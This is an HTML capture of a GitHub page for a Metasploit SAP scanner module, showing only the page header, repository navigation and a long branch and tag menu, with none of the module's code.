  


<!DOCTYPE html>
<html>
  <head prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# githubog: http://ogp.me/ns/fb/githubog#">
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <title>metasploit-framework/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb at master · rapid7/metasploit-framework · GitHub</title>
    <link rel="search" type="application/opensearchdescription+xml" href="/opensearch.xml" title="GitHub" />
    <link rel="fluid-icon" href="https://github.com/fluidicon.png" title="GitHub" />
    <link rel="apple-touch-icon" sizes="57x57" href="/apple-touch-icon-114.png" />
    <link rel="apple-touch-icon" sizes="114x114" href="/apple-touch-icon-114.png" />
    <link rel="apple-touch-icon" sizes="72x72" href="/apple-touch-icon-144.png" />
    <link rel="apple-touch-icon" sizes="144x144" href="/apple-touch-icon-144.png" />
    <link rel="logo" type="image/svg" href="http://github-media-downloads.s3.amazonaws.com/github-logo.svg" />
    <link rel="assets" href="https://a248.e.akamai.net/assets.github.com/">
    <link rel="xhr-socket" href="/_sockets" />
    


    <meta name="msapplication-TileImage" content="/windows-tile.png" />
    <meta name="msapplication-TileColor" content="#ffffff" />
    <meta name="selected-link" value="repo_source" data-pjax-transient />
    <meta content="collector.githubapp.com" name="octolytics-host" /><meta content="github" name="octolytics-app-id" />

    
    
    <link rel="icon" type="image/x-icon" href="/favicon.ico" />

    <meta content="authenticity_token" name="csrf-param" />
<meta content="37w+GsathgwSjohSTzSC50u5F8qXctAC13XbUHfxzOs=" name="csrf-token" />

    <link href="https://a248.e.akamai.net/assets.github.com/assets/github-0c2e6b2f619f4aafd0dc861f56d66b8fc3b130eb.css" media="all" rel="stylesheet" type="text/css" />
    <link href="https://a248.e.akamai.net/assets.github.com/assets/github2-44fe9f300dbf91bdda085764a64c513382a751b2.css" media="all" rel="stylesheet" type="text/css" />
    


      <script src="https://a248.e.akamai.net/assets.github.com/assets/frameworks-4c434fa1705bf526e191eec0cd8fab1a5ce3e326.js" type="text/javascript"></script>
      <script src="https://a248.e.akamai.net/assets.github.com/assets/github-1d3dcfe418be5cc86b6add463632b9e2cfe0cd0d.js" type="text/javascript"></script>
      
      <meta http-equiv="x-pjax-version" content="5358865310447c79347ea30bb9fd8280">

        <link data-pjax-transient rel='permalink' href='/rapid7/metasploit-framework/blob/df27e3e76cc815d17cb8efd86b39a2dd7c4a373f/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb'>
    <meta property="og:title" content="metasploit-framework"/>
    <meta property="og:type" content="githubog:gitrepository"/>
    <meta property="og:url" content="https://github.com/rapid7/metasploit-framework"/>
    <meta property="og:image" content="https://secure.gravatar.com/avatar/5d198df57a51ac06525bfa48c3ff9f6c?s=420&amp;d=https://a248.e.akamai.net/assets.github.com%2Fimages%2Fgravatars%2Fgravatar-user-420.png"/>
    <meta property="og:site_name" content="GitHub"/>
    <meta property="og:description" content="metasploit-framework - Metasploit Framework"/>
    <meta property="twitter:card" content="summary"/>
    <meta property="twitter:site" content="@GitHub">
    <meta property="twitter:title" content="rapid7/metasploit-framework"/>

    <meta name="description" content="metasploit-framework - Metasploit Framework" />


    <meta content="1013671" name="octolytics-dimension-user_id" /><meta content="rapid7" name="octolytics-dimension-user_login" /><meta content="2293158" name="octolytics-dimension-repository_id" /><meta content="rapid7/metasploit-framework" name="octolytics-dimension-repository_nwo" /><meta content="true" name="octolytics-dimension-repository_public" /><meta content="false" name="octolytics-dimension-repository_is_fork" /><meta content="2293158" name="octolytics-dimension-repository_network_root_id" /><meta content="rapid7/metasploit-framework" name="octolytics-dimension-repository_network_root_nwo" />
  <link href="https://github.com/rapid7/metasploit-framework/commits/master.atom" rel="alternate" title="Recent Commits to metasploit-framework:master" type="application/atom+xml" />

  </head>


  <body class="logged_out page-blob  vis-public env-production  ">
    <div id="wrapper">

      
      
      

      
      <div class="header header-logged-out">
  <div class="container clearfix">

    <a class="header-logo-wordmark" href="https://github.com/">Github</a>

    <div class="header-actions">
      <a class="button primary" href="/signup">Sign up</a>
      <a class="button" href="/login?return_to=%2Frapid7%2Fmetasploit-framework%2Fblob%2Fmaster%2Fmodules%2Fauxiliary%2Fscanner%2Fsap%2Fsap_ctc_verb_tampering_user_mgmt.rb">Sign in</a>
    </div>

    <div class="command-bar js-command-bar  in-repository">


      <ul class="top-nav">
          <li class="explore"><a href="/explore">Explore</a></li>
        <li class="features"><a href="/features">Features</a></li>
          <li class="enterprise"><a href="http://enterprise.github.com/">Enterprise</a></li>
          <li class="blog"><a href="/blog">Blog</a></li>
      </ul>
        <form accept-charset="UTF-8" action="/search" class="command-bar-form" id="top_search_form" method="get">
  <a href="/search/advanced" class="advanced-search-icon tooltipped downwards command-bar-search" id="advanced_search" title="Advanced search"><span class="octicon octicon-gear "></span></a>

  <input type="text" data-hotkey="/ s" name="q" id="js-command-bar-field" placeholder="Search or type a command" tabindex="1" autocapitalize="off"
    
      data-repo="rapid7/metasploit-framework"
      data-branch="master"
      data-sha="61202e342dde6983da9c87fb54596f63baf38fe1"
  >

    <input type="hidden" name="nwo" value="rapid7/metasploit-framework" />

    <div class="select-menu js-menu-container js-select-menu search-context-select-menu">
      <span class="minibutton select-menu-button js-menu-target">
        <span class="js-select-button">This repository</span>
      </span>

      <div class="select-menu-modal-holder js-menu-content js-navigation-container">
        <div class="select-menu-modal">

          <div class="select-menu-item js-navigation-item selected">
            <span class="select-menu-item-icon octicon octicon-check"></span>
            <input type="radio" class="js-search-this-repository" name="search_target" value="repository" checked="checked" />
            <div class="select-menu-item-text js-select-button-text">This repository</div>
          </div> <!-- /.select-menu-item -->

          <div class="select-menu-item js-navigation-item">
            <span class="select-menu-item-icon octicon octicon-check"></span>
            <input type="radio" name="search_target" value="global" />
            <div class="select-menu-item-text js-select-button-text">All repositories</div>
          </div> <!-- /.select-menu-item -->

        </div>
      </div>
    </div>

  <span class="octicon help tooltipped downwards" title="Show command bar help">
    <span class="octicon octicon-question"></span>
  </span>


  <input type="hidden" name="ref" value="cmdform">

  <div class="divider-vertical"></div>

</form>
    </div>

  </div>
</div>


      


            <div class="site hfeed" itemscope itemtype="http://schema.org/WebPage">
      <div class="hentry">
        
        <div class="pagehead repohead instapaper_ignore readability-menu ">
          <div class="container">
            <div class="title-actions-bar">
              

<ul class="pagehead-actions">



    <li>
      <a href="/login?return_to=%2Frapid7%2Fmetasploit-framework"
        class="minibutton with-count js-toggler-target star-button entice tooltipped upwards"
        title="You must be signed in to use this feature" rel="nofollow">
        <span class="octicon octicon-star"></span>Star
      </a>
      <a class="social-count js-social-count" href="/rapid7/metasploit-framework/stargazers">
        1,202
      </a>
    </li>
    <li>
      <a href="/login?return_to=%2Frapid7%2Fmetasploit-framework"
        class="minibutton with-count js-toggler-target fork-button entice tooltipped upwards"
        title="You must be signed in to fork a repository" rel="nofollow">
        <span class="octicon octicon-git-branch"></span>Fork
      </a>
      <a href="/rapid7/metasploit-framework/network" class="social-count">
        904
      </a>
    </li>
</ul>

              <h1 itemscope itemtype="http://data-vocabulary.org/Breadcrumb" class="entry-title public">
                <span class="repo-label"><span>public</span></span>
                <span class="mega-octicon octicon-repo"></span>
                <span class="author vcard">
                  <a href="/rapid7" class="url fn" itemprop="url" rel="author">
                  <span itemprop="title">rapid7</span>
                  </a></span> /
                <strong><a href="/rapid7/metasploit-framework" class="js-current-repository">metasploit-framework</a></strong>
              </h1>
            </div>

            
  <ul class="tabs">
    <li class="pulse-nav"><a href="/rapid7/metasploit-framework/pulse" class="js-selected-navigation-item " data-selected-links="pulse /rapid7/metasploit-framework/pulse" rel="nofollow"><span class="octicon octicon-pulse"></span></a></li>
    <li><a href="/rapid7/metasploit-framework" class="js-selected-navigation-item selected" data-selected-links="repo_source repo_downloads repo_commits repo_tags repo_branches /rapid7/metasploit-framework">Code</a></li>
    <li><a href="/rapid7/metasploit-framework/network" class="js-selected-navigation-item " data-selected-links="repo_network /rapid7/metasploit-framework/network">Network</a></li>
    <li><a href="/rapid7/metasploit-framework/pulls" class="js-selected-navigation-item " data-selected-links="repo_pulls /rapid7/metasploit-framework/pulls">Pull Requests <span class='counter'>52</span></a></li>

      <li><a href="/rapid7/metasploit-framework/issues" class="js-selected-navigation-item " data-selected-links="repo_issues /rapid7/metasploit-framework/issues">Issues <span class='counter'>53</span></a></li>

      <li><a href="/rapid7/metasploit-framework/wiki" class="js-selected-navigation-item " data-selected-links="repo_wiki /rapid7/metasploit-framework/wiki">Wiki</a></li>


    <li><a href="/rapid7/metasploit-framework/graphs" class="js-selected-navigation-item " data-selected-links="repo_graphs repo_contributors /rapid7/metasploit-framework/graphs">Graphs</a></li>


  </ul>
  
<div class="tabnav">

  <span class="tabnav-right">
    <ul class="tabnav-tabs">
          <li><a href="/rapid7/metasploit-framework/tags" class="js-selected-navigation-item tabnav-tab" data-selected-links="repo_tags /rapid7/metasploit-framework/tags">Tags <span class="counter ">113</span></a></li>
    </ul>
  </span>

  <div class="tabnav-widget scope">


    <div class="select-menu js-menu-container js-select-menu js-branch-menu">
      <a class="minibutton select-menu-button js-menu-target" data-hotkey="w" data-ref="master">
        <span class="octicon octicon-git-branch"></span>
        <i>branch:</i>
        <span class="js-select-button">master</span>
      </a>

      <div class="select-menu-modal-holder js-menu-content js-navigation-container">

        <div class="select-menu-modal">
          <div class="select-menu-header">
            <span class="select-menu-title">Switch branches/tags</span>
            <span class="octicon octicon-remove-close js-menu-close"></span>
          </div> <!-- /.select-menu-header -->

          <div class="select-menu-filters">
            <div class="select-menu-text-filter">
              <input type="text" id="commitish-filter-field" class="js-filterable-field js-navigation-enable" placeholder="Filter branches/tags">
            </div>
            <div class="select-menu-tabs">
              <ul>
                <li class="select-menu-tab">
                  <a href="#" data-tab-filter="branches" class="js-select-menu-tab">Branches</a>
                </li>
                <li class="select-menu-tab">
                  <a href="#" data-tab-filter="tags" class="js-select-menu-tab">Tags</a>
                </li>
              </ul>
            </div><!-- /.select-menu-tabs -->
          </div><!-- /.select-menu-filters -->

          <div class="select-menu-list select-menu-tab-bucket js-select-menu-tab-bucket css-truncate" data-tab-filter="branches">

            <div data-filterable-for="commitish-filter-field" data-filterable-type="substring">

                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/Datacut-master/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="Datacut-master" rel="nofollow" title="Datacut-master">Datacut-master</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/feature/enable-rhost-rport-httpclient/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="feature/enable-rhost-rport-httpclient" rel="nofollow" title="feature/enable-rhost-rport-httpclient">feature/enable-rhost-rport-httpclient</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/feature/railgun/error_msg/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="feature/railgun/error_msg" rel="nofollow" title="feature/railgun/error_msg">feature/railgun/error_msg</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/fix/add-shodan-require/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="fix/add-shodan-require" rel="nofollow" title="fix/add-shodan-require">fix/add-shodan-require</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item selected">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="master" rel="nofollow" title="master">master</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/release/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="release" rel="nofollow" title="release">release</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/unstable/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="unstable" rel="nofollow" title="unstable">unstable</a>
                </div> <!-- /.select-menu-item -->
            </div>

              <div class="select-menu-no-results">Nothing to show</div>
          </div> <!-- /.select-menu-list -->


          <div class="select-menu-list select-menu-tab-bucket js-select-menu-tab-bucket css-truncate" data-tab-filter="tags">
            <div data-filterable-for="commitish-filter-field" data-filterable-type="substring">

                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/sprint-B04/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="sprint-B04" rel="nofollow" title="sprint-B04">sprint-B04</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/sprint-B03/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="sprint-B03" rel="nofollow" title="sprint-B03">sprint-B03</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/sprint-B02/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="sprint-B02" rel="nofollow" title="sprint-B02">sprint-B02</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/sprint-B01/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="sprint-B01" rel="nofollow" title="sprint-B01">sprint-B01</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/sprint-B00/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="sprint-B00" rel="nofollow" title="sprint-B00">sprint-B00</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/sprint-A07/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="sprint-A07" rel="nofollow" title="sprint-A07">sprint-A07</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/sprint-A06/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="sprint-A06" rel="nofollow" title="sprint-A06">sprint-A06</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/sprint-A05/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="sprint-A05" rel="nofollow" title="sprint-A05">sprint-A05</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/sprint-A04/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="sprint-A04" rel="nofollow" title="sprint-A04">sprint-A04</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/sprint-A03/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="sprint-A03" rel="nofollow" title="sprint-A03">sprint-A03</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/sprint-A02/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="sprint-A02" rel="nofollow" title="sprint-A02">sprint-A02</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/sprint-A01/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="sprint-A01" rel="nofollow" title="sprint-A01">sprint-A01</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/20120213000001/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="20120213000001" rel="nofollow" title="20120213000001">20120213000001</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/20120131000001/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="20120131000001" rel="nofollow" title="20120131000001">20120131000001</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/20120124000001/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="20120124000001" rel="nofollow" title="20120124000001">20120124000001</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/20120117000001/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="20120117000001" rel="nofollow" title="20120117000001">20120117000001</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/20120110000001/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="20120110000001" rel="nofollow" title="20120110000001">20120110000001</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/20120103000001/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="20120103000001" rel="nofollow" title="20120103000001">20120103000001</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/20111227000001/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="20111227000001" rel="nofollow" title="20111227000001">20111227000001</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/20111219000001/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="20111219000001" rel="nofollow" title="20111219000001">20111219000001</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/20111214013016/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="20111214013016" rel="nofollow" title="20111214013016">20111214013016</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/20111213184834/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="20111213184834" rel="nofollow" title="20111213184834">20111213184834</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/20111205000001/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="20111205000001" rel="nofollow" title="20111205000001">20111205000001</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2013061201/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2013061201" rel="nofollow" title="2013061201">2013061201</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2013060501/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2013060501" rel="nofollow" title="2013060501">2013060501</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2013052901/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2013052901" rel="nofollow" title="2013052901">2013052901</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2013052201/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2013052201" rel="nofollow" title="2013052201">2013052201</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2013050801/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2013050801" rel="nofollow" title="2013050801">2013050801</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2013050101/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2013050101" rel="nofollow" title="2013050101">2013050101</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2013042401/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2013042401" rel="nofollow" title="2013042401">2013042401</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2013041701/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2013041701" rel="nofollow" title="2013041701">2013041701</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2013041001/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2013041001" rel="nofollow" title="2013041001">2013041001</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2013040301/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2013040301" rel="nofollow" title="2013040301">2013040301</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2013032701/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2013032701" rel="nofollow" title="2013032701">2013032701</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2013032001/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2013032001" rel="nofollow" title="2013032001">2013032001</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2013031101/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2013031101" rel="nofollow" title="2013031101">2013031101</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2013022701/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2013022701" rel="nofollow" title="2013022701">2013022701</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2013022001/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2013022001" rel="nofollow" title="2013022001">2013022001</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2013021301/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2013021301" rel="nofollow" title="2013021301">2013021301</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2013020601/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2013020601" rel="nofollow" title="2013020601">2013020601</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
